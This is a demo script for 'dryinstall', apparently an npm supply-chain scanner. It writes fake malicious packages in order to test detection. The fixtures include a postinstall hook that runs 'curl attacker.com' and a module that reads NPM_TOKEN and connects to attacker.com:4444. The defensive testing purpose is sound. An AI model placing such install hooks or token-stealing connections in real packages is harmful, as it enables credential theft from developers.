'use strict';

/**
 * scan-demo.js
 * 기존 node_modules 스캔 + dry_modules 마이그레이션 데모
 */

const path = require('path');
const fs = require('fs');
const Scanner = require('../src/scanner');

const DEMO_DIR = path.join(__dirname, '..', 'scan-demo-workspace');

// 데모용 가짜 node_modules 구성
function setupFakeNodeModules() {
  const nodeModules = path.join(DEMO_DIR, 'node_modules');
  fs.mkdirSync(nodeModules, { recursive: true });

  // 안전한 패키지
  const safePkg = path.join(nodeModules, 'safe-lib');
  fs.mkdirSync(safePkg, { recursive: true });
  fs.writeFileSync(path.join(safePkg, 'package.json'), JSON.stringify({
    name: 'safe-lib', version: '1.0.0', main: 'index.js'
  }));
  fs.writeFileSync(path.join(safePkg, 'index.js'), `
const path = require('path');
module.exports = { greet: (n) => 'Hello ' + n };
  `);

  // 악성 패키지 1 — postinstall
  const evilPkg1 = path.join(nodeModules, 'evil-lib');
  fs.mkdirSync(evilPkg1, { recursive: true });
  fs.writeFileSync(path.join(evilPkg1, 'package.json'), JSON.stringify({
    name: 'evil-lib', version: '1.0.0', main: 'index.js',
    scripts: { postinstall: 'node -e "require(\'child_process\').exec(\'curl attacker.com\')"' }
  }));
  fs.writeFileSync(path.join(evilPkg1, 'index.js'), `
const { execSync } = require('child_process');
execSync('echo HACKED');
module.exports = {};
  `);

  // 악성 패키지 2 — env 탈취
  const evilPkg2 = path.join(nodeModules, 'stealer-lib');
  fs.mkdirSync(evilPkg2, { recursive: true });
  fs.writeFileSync(path.join(evilPkg2, 'package.json'), JSON.stringify({
    name: 'stealer-lib', version: '1.0.0', main: 'index.js'
  }));
  fs.writeFileSync(path.join(evilPkg2, 'index.js'), `
const token = process.env.NPM_TOKEN;
const net = require('net');
net.connect(4444, 'attacker.com');
module.exports = {};
  `);
}

async function runScanDemo() {
  // 초기화
  if (fs.existsSync(DEMO_DIR)) fs.rmSync(DEMO_DIR, { recursive: true });
  fs.mkdirSync(DEMO_DIR, { recursive: true });

  console.log('\n════════════════════════════════════════════════════');
  console.log('  dryinstall Scanner Demo');
  console.log('  기존 node_modules/ 스캔 → 탐지 → dry_modules/ 마이그레이션');
  console.log('════════════════════════════════════════════════════\n');

  // 가짜 node_modules 세팅
  setupFakeNodeModules();
  console.log('[Demo] node_modules/ 구성:');
  console.log('  - safe-lib    (정상 패키지)');
  console.log('  - evil-lib    (postinstall + child_process)');
  console.log('  - stealer-lib (env 탈취 + net 연결)\n');

  // 스캔 실행
  const scanner = new Scanner(DEMO_DIR);
  const report = await scanner.scan();

  // npm start 차단 시뮬레이션
  console.log('════════════════════════════════════════════════════');
  console.log('  npm start 가로채기 시뮬레이션');
  console.log('════════════════════════════════════════════════════\n');

  if (report.dangerous.length > 0) {
    console.error('\x1b[31m[dryinstall] npm start ABORTED\x1b[0m');
    console.error('\x1b[31m[dryinstall] 위험 패키지가 감지되어 실행을 차단합니다:\x1b[0m');
    report.dangerous.forEach(({ pkg }) => {
      console.error(`  ✗ ${pkg}`);
    });
    console.log('\n\x1b[32m[dryinstall] 안전한 패키지는 dry_modules/로 마이그레이션 완료\x1b[0m');
    console.log('\x1b[32m[dryinstall] loader.js를 통해 sandbox에서만 실행 가능\x1b[0m');
  }
}

runScanDemo().catch(console.error);
